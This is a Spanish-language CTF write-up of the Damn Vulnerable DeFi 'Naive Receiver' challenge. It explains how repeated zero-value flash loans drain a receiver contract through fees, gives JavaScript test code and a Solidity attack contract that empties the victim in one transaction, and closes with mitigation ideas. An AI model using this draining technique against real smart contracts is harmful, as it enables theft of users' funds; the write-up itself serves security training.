---
title: Solucion al challenge \#2 Naive Receiver
date: 2022-01-3
excerpt: Hay una lending pool que ofrece flash loans de ethers, tiene 1000 ethers. Tambien vez que un usuario deployeo un contrato con un balance de 10 ETH que es capaz de interactuar con el lending pool y realizar flash loans. Tu objetivo es disminuir/drenar el balance de este contrato. Hacerlo en una sola transaccion es un plus.
---

Hay una lending pool que ofrece flash loans de ethers, tiene 1000 ethers.

Tambien vez que un usuario deployeo un contrato con un balance de 10 ETH que es capaz de interactuar con el lending pool y realizar flash loans.

Tu objetivo es disminuir/drenar el balance de este contrato. Hacerlo en una sola transaccion es un plus.

## Objetivo

El objetivo es hacer que el contrato del usuario que usa el pool quede en 0. El truco es bastante sencillo, basta con pedir un prestamo de 0 ethers y que lo reciba el contrato del usuario [FlashLoanReceiver.sol](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/contracts/naive-receiver/FlashLoanReceiver.sol)

## Exploit

Bastante sencillo, por cada prestamo que se pide 0 ethers, pero el contrato devuelve 0 + 1ether que es el fee.
```js
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */   
        for(let i = 0; i < 10; i+=1) {
            await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('0'));
        }
    });
```

Un plus es realizar el drenado en una sola transaccion, en el caso del for se realizan 10 transacciones, para esto solo basta armar contrato que use el pool pidiendo prestamos de 0 en nombre del contrato del usuario

*ExploiteNaiveReceiver.sol*
```js
pragma solidity ^0.8.0;

interface INaiveLenderPool {
  function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract ExploitNaiveReceiver {
  function attack(address pool, address receiverVictim, uint256 n) external {
    for(uint256 i = 0; i < n; i++) {
      INaiveLenderPool(pool).flashLoan(receiverVictim, 0);
    }
  }
}```

```js
    it('Exploit', async function () {
      const ExploitNaiveReceiver = await ethers.getContractFactory('ExploitNaiveReceiver', attacker);
      const exploitNaiveReceiver = await ExploitNaiveReceiver.deploy();
      await exploitNaiveReceiver.attack(this.pool.address, this.receiver.address, "10");
    })
```

## Soluciones

Una posible solucion seria que el contrato del usuario _FlashLoanReceiver.sol_ cheque que esta ganado ether en la operacion, y en caso de perdida que haga un revert. Aunque es posible que el usuario lo haya diseñado asi por un motivo y no le importe perder ether, en ese caso otra alternativa seria que haga un cheque para saber que el que origino la transaccion sea el usuario que creo el contrato (usando tx.origin). Aunque esto tambien es considerado peligroso y vulnerable a un phising.

Una ultima altenativa seria mejorar un poco el contrato _FlashLoanReceiver.sol_, y usar una funcion que reciba ether del usuario y que solo ese usuario pueda realizar esos prestamos (tambien haciendo uso del tx.origin que no es considerado como una practica tan segura)